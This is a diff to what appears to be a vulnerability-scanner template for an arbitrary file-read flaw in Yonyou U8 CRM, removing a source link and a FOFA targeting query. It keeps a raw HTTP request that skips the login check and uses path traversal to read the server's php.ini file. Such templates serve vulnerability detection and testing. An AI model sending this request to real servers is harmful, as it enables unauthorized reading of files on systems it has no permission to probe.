@@ -3,12 +3,8 @@ info:
   name: 用友crm客户关系管理pub downloadfile.php接口 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ft97mfa9ndwlm5uk'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ft97mfa9ndwlm5uk
-    fofa: app="用友U8CRM"
 http:
 - raw:
   - 'GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
